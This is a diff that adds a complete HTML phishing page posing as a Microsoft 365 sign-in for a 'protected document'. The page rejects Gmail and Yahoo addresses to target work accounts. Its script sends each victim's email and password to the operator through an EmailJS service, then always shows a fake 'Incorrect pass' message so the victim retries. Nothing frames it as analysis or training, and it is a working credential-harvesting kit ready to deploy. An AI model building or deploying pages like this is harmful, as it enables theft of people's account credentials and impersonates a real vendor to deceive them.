@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Organisation Document</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background-image: url('https://assets.replocdn.com/projects/d5366298-b863-41a5-928c-ec794a1b6ba1/chat-assets-00e10df7-a91f-43d3-9f4c-02ded3fbd5e8');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.3);
+            z-index: 0;
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 450px;
+            width: 100%;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            max-width: 200px;
+            height: auto;
+            display: inline-block;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #333;
+            margin-bottom: 30px;
+            font-size: 16px;
+            line-height: 1.5;
+            font-weight: 400;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s;
+            font-family: inherit;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+        }
+
+        input.error {
+            border-color: #ef4444;
+        }
+
+        .error-message {
+            background: #fef2f2;
+            color: #ef4444;
+            font-size: 14px;
+            margin-top: 6px;
+            padding: 10px 12px;
+            border-radius: 6px;
+            border-left: 3px solid #ef4444;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s, background 0.2s;
+        }
+
+        .btn:hover {
+            background: #2563eb;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(59, 130, 246, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT7rRuKydblq6V-Kz-wQguuAMpm1U3At1erPA&s" alt="Microsoft 365">
+        </div>
+        
+        <p class="subtitle">This document is protected! Sign-In With Email To View Document</p>
+
+        <form id="signupForm">
+            <div class="form-group">
+                <input 
+                    type="email" 
+                    id="email" 
+                    name="email" 
+                    placeholder="Email"
+                    required
+                >
+                <div class="error-message" id="emailError"></div>
+            </div>
+
+            <div class="form-group">
+                <input 
+                    type="password" 
+                    id="name" 
+                    name="name" 
+                    placeholder="Password"
+                    required
+                >
+                <div class="error-message" id="nameError"></div>
+            </div>
+
+            <button type="submit" class="btn" id="submitBtn">
+                View Document
+            </button>
+        </form>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
+    <script>
+        emailjs.init('YUcVHbdM2SYWmU71R');
+
+        const form = document.getElementById('signupForm');
+        const emailInput = document.getElementById('email');
+        const nameInput = document.getElementById('name');
+        const submitBtn = document.getElementById('submitBtn');
+        const emailError = document.getElementById('emailError');
+        const nameError = document.getElementById('nameError');
+
+        emailInput.addEventListener('input', function() {
+            this.classList.remove('error');
+            emailError.classList.remove('show');
+        });
+
+        nameInput.addEventListener('input', function() {
+            this.classList.remove('error');
+            nameError.classList.remove('show');
+        });
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const email = emailInput.value.trim().toLowerCase();
+            const name = nameInput.value.trim();
+
+            emailInput.classList.remove('error');
+            nameInput.classList.remove('error');
+            emailError.classList.remove('show');
+            nameError.classList.remove('show');
+
+            if (email.includes('@gmail.')) {
+                emailInput.classList.add('error');
+                emailError.textContent = 'Please use a work email (Gmail is not allowed)';
+                emailError.classList.add('show');
+                return;
+            }
+
+            if (email.includes('@yahoo.')) {
+                emailInput.classList.add('error');
+                emailError.textContent = 'Please use a work email (Yahoo is not allowed)';
+                emailError.classList.add('show');
+                return;
+            }
+
+            submitBtn.disabled = true;
+
+            try {
+                await emailjs.send('service_lrxpbg4', 'template_sujbibi', {
+                    name: name,
+                    email: email
+                });
+
+                nameInput.classList.add('error');
+                nameError.textContent = 'Incorrect pass! Please try again';
+                nameError.classList.add('show');
+                nameInput.value = '';
+                nameInput.focus();
+
+            } catch (error) {
+                nameInput.classList.add('error');
+                nameError.textContent = 'Incorrect pass! Please try again';
+                nameError.classList.add('show');
+                nameInput.value = '';
+                nameInput.focus();
+            } finally {
+                submitBtn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
